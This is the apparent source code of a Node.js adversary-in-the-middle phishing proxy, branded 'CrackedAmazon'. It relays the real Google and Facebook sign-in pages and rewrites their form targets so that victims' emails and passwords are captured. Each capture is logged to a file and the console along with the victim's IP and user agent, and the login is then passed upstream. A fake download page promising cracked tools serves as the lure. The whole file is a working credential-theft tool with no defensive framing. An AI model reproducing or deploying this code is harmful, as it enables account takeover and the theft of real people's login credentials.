const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;
app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
    secret: 'crackedamazon-secret',
    resave: false,
    saveUninitialized: true
}));
app.use(express.static(__dirname));
const captures = [];
app.get('/auth/google', (req, res, next) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    createProxyMiddleware({
        target: 'https://accounts.google.com',
        changeOrigin: true,
        secure: false,
        followRedirects: true,
        logLevel: 'error',
        onProxyReq: (proxyReq, req, res) => {
            proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        },
        onProxyRes: (proxyRes, req, res) => {
            let body = '';
            proxyRes.on('data', chunk => { body += chunk; });
            proxyRes.on('end', () => {
                body = body.replace(/action="\/v3\/signin\/challenge/g, 'action="/capture/google');
                res.setHeader('Content-Type', 'text/html');
                res.send(body);
            });
        }
    })(req, res, next);
});
app.get('/auth/facebook', (req, res, next) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    createProxyMiddleware({
        target: 'https://www.facebook.com',
        changeOrigin: true,
        secure: false,
        followRedirects: true,
        logLevel: 'error',
        onProxyReq: (proxyReq, req, res) => {
            proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        },
        onProxyRes: (proxyRes, req, res) => {
            let body = '';
            proxyRes.on('data', chunk => { body += chunk; });
            proxyRes.on('end', () => {
                body = body.replace(/action="\/login\/device-based\/validate-password/g, 'action="/capture/facebook');
                res.setHeader('Content-Type', 'text/html');
                res.send(body);
            });
        }
    })(req, res, next);
});
app.post('/capture/google', (req, res, next) => {
    const { email, password } = req.body;
    const tool = req.session.tool || 'unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const capture = {
        timestamp: new Date().toISOString(),
        provider: 'google',
        email,
        password,
        tool,
        ip,
        userAgent: req.headers['user-agent']
    };
    captures.push(capture);
    fs.appendFileSync('captures.txt', JSON.stringify(capture) + '\n');
    console.log(`✅ GOOGLE CAPTURED: ${email}:${password}`);
    req.body = { ...req.body, continue: 'https://myaccount.google.com' };
    next();
});
app.use('/capture/google', createProxyMiddleware({
    target: 'https://accounts.google.com',
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    logLevel: 'error',
    onProxyReq: (proxyReq, req, res) => {
        if (req.body) {
            const bodyData = new URLSearchParams(req.body).toString();
            proxyReq.setHeader('Content-Type', 'application/x-www-form-urlencoded');
            proxyReq.setHeader('Content-Length', Buffer.byteLength(bodyData));
            proxyReq.write(bodyData);
        }
    }
}));
app.post('/capture/facebook', (req, res, next) => {
    const { email, pass } = req.body;
    const tool = req.session.tool || 'unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const capture = {
        timestamp: new Date().toISOString(),
        provider: 'facebook',
        email,
        password: pass,
        tool,
        ip,
        userAgent: req.headers['user-agent']
    };
    captures.push(capture);
    fs.appendFileSync('captures.txt', JSON.stringify(capture) + '\n');
    console.log(`✅ FACEBOOK CAPTURED: ${email}:${pass}`);
    req.body = { ...req.body, lsd: 'AVqQEJk4yEw' };
    next();
});
app.use('/capture/facebook', createProxyMiddleware({
    target: 'https://www.facebook.com',
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    logLevel: 'error',
    onProxyReq: (proxyReq, req, res) => {
        if (req.body) {
            const bodyData = new URLSearchParams(req.body).toString();
            proxyReq.setHeader('Content-Type', 'application/x-www-form-urlencoded');
            proxyReq.setHeader('Content-Length', Buffer.byteLength(bodyData));
            proxyReq.write(bodyData);
        }
    }
}));
app.get('/download', (req, res) => {
    const tool = req.query.tool || req.session.tool || 'tool';
    const toolName = tool.replace(/-/g, ' ');
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Download • CrackedAmazon</title>
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: white; text-align: center; padding: 20px; margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
            .card { background: #1e293b; border-radius: 16px; padding: 40px; max-width: 400px; width: 100%; border: 1px solid #334155; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); }
            .success { color: #10b981; font-size: 64px; margin-bottom: 20px; }
            h2 { color: #f97316; margin-bottom: 15px; font-size: 28px; }
            .btn { background: #f97316; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; margin: 20px 0; cursor: pointer; width: 100%; }
            .note { color: #94a3b8; font-size: 14px; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="success">✓</div>
            <h2>${toolName}</h2>
            <p style="color: #cbd5e1;">Verification successful! Your download is ready.</p>
            <button class="btn" onclick="alert('Download started!')">Download Now</button>
            <div class="note">⚡ 2,304 downloads today</div>
        </div>
        <script>setTimeout(()=>alert('Download started!'),2000);</script>
    </body>
    </html>
    `);
});
app.get('/health', (req, res) => res.send('OK'));
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ AiTM PROXY RUNNING ON PORT ${PORT}`);
});
